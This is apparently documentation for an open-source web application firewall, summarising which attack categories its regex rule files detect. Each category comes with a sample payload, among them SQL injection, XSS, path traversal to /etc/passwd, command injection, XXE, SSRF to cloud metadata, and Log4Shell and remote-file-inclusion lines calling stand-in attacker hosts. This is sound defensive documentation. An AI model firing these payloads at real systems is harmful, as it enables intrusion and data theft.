# Attack Coverage

This document summarises the attack categories addressed by the rule files shipped under [`rules/`](https://github.com/fabriziosalmi/caddy-waf/tree/main/rules) and [`rules.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules.json). The coverage is regex-based; it complements, but does not replace, application-layer input validation, parameterised database queries, output encoding, and a sound authentication / authorisation design.

The categories below correspond to the bundled rule sets. Each item lists the file (or files) that exercise the category, the kind of payloads the regex patterns target, and a representative example.

---

## SQL Injection
- **Files**: [`rules/sql-injection.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules/sql-injection.json), entries in [`rules.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules.json).
- **Targets**: `ARGS`, `BODY`, `HEADERS`, `COOKIES`.
- **Patterns detect**: classic boolean tautologies, UNION-based extraction, comment-bypass tokens (`--`, `/* */`), stacked statements, time-based functions (`SLEEP`, `BENCHMARK`).
- **Example**: `id=1' OR '1'='1' --`

## Cross-Site Scripting (XSS)
- **Files**: [`rules/xss.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules/xss.json).
- **Targets**: `ARGS`, `BODY`, `HEADERS`, `COOKIES`.
- **Patterns detect**: `<script>` tags, event-handler attributes (`onerror=`, `onload=`), `javascript:` URLs, common encoded variants.
- **Example**: `<img src=x onerror=alert(1)>`

## Path Traversal / Local File Inclusion
- **Files**: [`rules/lfi.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules/lfi.json).
- **Targets**: `URI`, `ARGS`, `HEADERS`.
- **Patterns detect**: `../`, `..\\`, URL-encoded variants (`%2e%2e/`), Unicode escapes, well-known target paths (`/etc/passwd`, `/proc/self/environ`).
- **Example**: `?file=../../../../etc/passwd`

## Remote Code Execution / Command Injection
- **Files**: [`rules/rce.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules/rce.json).
- **Targets**: `ARGS`, `BODY`, `HEADERS`, `COOKIES`, `URI`.
- **Patterns detect**: shell metacharacters (`|`, `;`, `&&`, backticks), `$( … )`, common command names (`cat`, `whoami`, `nc`, `wget`, `curl`).
- **Example**: `?cmd=$(whoami)`

## Remote File Inclusion
- **Files**: [`rules/rfi.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules/rfi.json).
- **Targets**: `ARGS`, `BODY`.
- **Patterns detect**: `http://` / `https://` / `ftp://` URLs supplied as input parameters.
- **Example**: `?include=http://evil.example/shell.txt`

## Server-Side Request Forgery (SSRF)
- **Files**: [`rules/ssrf.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules/ssrf.json).
- **Targets**: `ARGS`, `BODY`, `HEADERS`.
- **Patterns detect**: `localhost`, `127.0.0.0/8`, `169.254.169.254` (cloud metadata), private CIDR space, alternate localhost schemes.
- **Example**: `?url=http://169.254.169.254/latest/meta-data/`

## XML External Entity (XXE)
- **Files**: [`rules/xxe.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules/xxe.json).
- **Targets**: `BODY`, `ARGS`.
- **Patterns detect**: `<!DOCTYPE … [ <!ENTITY` declarations, `SYSTEM` entities, parameter entities.
- **Example**: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`

## Server-Side Template Injection (SSTI)
- **Files**: [`rules/ssti.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules/ssti.json).
- **Targets**: `ARGS`, `BODY`.
- **Patterns detect**: <span v-pre>`{{ … }}`</span>, `${ … }`, `<%= … %>` and other template engine sigils.
- **Example**: <span v-pre>`?name={{7*7}}`</span>

## NoSQL Injection
- **Files**: [`rules/data-validation.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules/data-validation.json) and entries in [`rules.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules.json).
- **Targets**: `ARGS`, `BODY`.
- **Patterns detect**: MongoDB operators (`$ne`, `$gt`, `$where`), JSON operator-injection idioms.
- **Example**: `{"username": {"$ne": null}}`

## LDAP / XPath Injection
- **Files**: rules in [`rules.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules.json).
- **Targets**: `ARGS`, `BODY`.
- **Patterns detect**: `(|`, `&(`, `*)(uid=*` and similar bypass payloads.
- **Example**: `?user=*)(uid=*)`

## HTTP Request Smuggling
- **Files**: [`rules/smuggling.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules/smuggling.json).
- **Targets**: `HEADERS`.
- **Patterns detect**: conflicting `Transfer-Encoding`/`Content-Length` combinations, `Transfer-Encoding: chunked` permutations, suspicious whitespace.

## CRLF Injection / Response Splitting
- **Files**: entries in [`rules.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules.json) (`crlf-injection-headers`).
- **Targets**: `HEADERS`, `ARGS`.
- **Patterns detect**: literal `\r\n` and URL-encoded variants (`%0d%0a`).

## HTTP Parameter Pollution
- **Files**: [`rules/hpp.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules/hpp.json).
- **Targets**: `ARGS`.
- **Patterns detect**: duplicate / conflicting parameter idioms typical of HPP exploitation.

## Insecure Deserialization
- **Files**: [`rules/insecure-deserialization.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules/insecure-deserialization.json).
- **Targets**: `BODY`, `HEADERS`, `COOKIES`.
- **Patterns detect**: Java serialised object magic (`AC ED`), PHP serialised tags (`O:` / `s:`), Python pickle markers.

## CSRF / Origin Tampering
- **Files**: [`rules/csfr.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules/csfr.json).
- **Targets**: `HEADERS`.
- **Patterns detect**: missing or mismatched `Origin` / `Referer`, inconsistent CSRF tokens. (CSRF defense in depth still requires a server-side token check; the WAF rules add a second line of inspection.)

## GraphQL Introspection / Abuse
- **Files**: [`rules/graphql.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules/graphql.json).
- **Targets**: `BODY`, `URI`.
- **Patterns detect**: `__schema`, `__type`, deep nested queries.

## Authentication Abuse
- **Files**: [`rules/authentication.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules/authentication.json).
- **Targets**: `URI`, `ARGS`, `BODY`.
- **Patterns detect**: high-volume credential stuffing markers, well-known login endpoints (`wp-login.php`, `xmlrpc.php`).

## Vulnerability Exploitation (CVE-specific)
- **Files**: [`rules/vulnerability.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules/vulnerability.json), entries in [`rules.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules.json).
- **Targets**: `URI`, `BODY`, `HEADERS`.
- **Patterns detect**: known exploit signatures including Log4Shell (CVE-2021-44228) JNDI lookups.
- **Example (Log4Shell)**: `${jndi:ldap://attacker.example/a}`

## Scanner / Tooling Detection
- **Files**: entries in [`rules.json`](https://github.com/fabriziosalmi/caddy-waf/blob/main/rules.json) (`block-scanners`).
- **Targets**: `HEADERS:User-Agent`.
- **Patterns detect**: User-Agent strings emitted by known scanners (Nikto, sqlmap, Nmap, Nessus, OpenVAS, Burp Suite, Nuclei, …).

## SpiderLabs / Trustwave Rules
- **Not shipped as a bundle.** An earlier `rules/spiderlabs.json` was a raw ModSecurity CRS export whose `@rx`/`@eq`/`@pmFromFile` operator syntax this engine does not interpret, so its rules never matched real traffic; it was removed in the #172 rule audit.
- **Generate your own instead**: [`get_spiderlabs_rules.py`](https://github.com/fabriziosalmi/caddy-waf/blob/main/get_spiderlabs_rules.py) keeps only CRS `@rx` (regex) rules and strips the operator, producing an RE2-compatible `spiderlabs_rules.json` you can point `rule_file` at. Non-regex CRS operators (`@detectSQLi`, `@pmFromFile`, …) are skipped because caddy-waf matches patterns with Go's RE2, not the ModSecurity operator set.

---

## Layered defence

Regex rules are necessary but not sufficient. Pair this WAF with:

- Input validation and parameterised queries in the application layer.
- Strict CORS and CSRF token handling.
- Network-level controls: TLS termination, reverse proxy with sane timeouts, observability.
- Periodic review of the bundled rule files; the threat landscape evolves and so must the rules.

See [scripts.md](scripts.md) for helpers that ingest external feeds and produce updated rule and blacklist files.
